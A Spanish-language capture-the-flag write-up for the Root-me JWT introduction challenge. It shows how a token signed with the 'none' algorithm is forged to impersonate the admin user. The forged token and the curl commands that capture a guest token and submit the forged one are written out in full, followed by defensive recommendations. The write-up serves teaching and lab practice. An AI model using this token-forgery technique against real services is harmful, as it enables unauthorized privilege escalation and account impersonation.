
# Root-me Write-up: JSON Web Token (JWT) - Introduction

## 1. Identificación y Captura

Al analizar la página de inicio, se observó un formulario de login y un acceso directo para invitados: `index.php?guest`. Al acceder como invitado, el servidor asigna un **JSON Web Token (JWT)** a través de una cookie de sesión.

**Comando para capturar el token original:**

```bash
curl -v "http://challenge01.root-me.org/web-serveur/ch58/index.php?guest"

```

En la respuesta, se identificó la cookie: `Set-Cookie: jwt=header.payload.signature`.

## 2. Análisis del Token

Un JWT se compone de tres partes codificadas en **Base64URL**:

1. **Header:** Define el algoritmo de firma (ej. `HS256`).
2. **Payload:** Contiene los claims o datos del usuario (ej. `username: guest`).
3. **Signature:** El hash que valida que el token no ha sido alterado.

## 3. Vulnerabilidad: Algoritmo Nulo (`none` algorithm)

El reto presenta una implementación insegura de la librería JWT que acepta el algoritmo `none`. Esto permite que un atacante elimine la firma y modifique el payload, y el servidor aceptará los datos como válidos al no tener una firma que verificar.

## 4. Explotación (Privilege Escalation)

Para obtener la flag, es necesario suplantar al usuario `admin`.

### Paso 1: Falsificar el Header

Modificamos el algoritmo a `none`.

* **JSON:** `{"alg":"none","typ":"JWT"}`
* **Base64URL:** `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

### Paso 2: Falsificar el Payload

Cambiamos la identidad del usuario.

* **JSON:** `{"username":"admin"}`
* **Base64URL:** `eyJ1c2VybmFtZSI6ImFkbWluIn0`

### Paso 3: Construcción del Token Malicioso

Unimos las dos partes con un punto y añadimos un **punto final**. El punto final es obligatorio porque indica que la sección de la firma existe pero está vacía.

* **Token final:** `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.`

## 5. Ejecución del Ataque

Enviamos el token manipulado de vuelta al servidor mediante `curl`:

```bash
curl -v -b "jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0." "http://challenge01.root-me.org/web-serveur/ch58/index.php"

```

**Resultado:** El servidor procesa el token, identifica al usuario como `admin` debido al algoritmo `none` y devuelve la flag de validación.

---

## Recomendaciones de Seguridad

* **Deshabilitar el algoritmo `none`:** Las librerías modernas deben configurarse para rechazar explícitamente tokens con `{"alg":"none"}`.
* **Validación de Algoritmo:** El servidor debe forzar el uso de un algoritmo específico (ej. solo `HS256`) y nunca confiar en el encabezado enviado por el usuario para decidir cómo verificar la firma.
* **Secretos Robustos:** Utilizar claves de firma largas y complejas para evitar ataques de fuerza bruta sobre la firma.

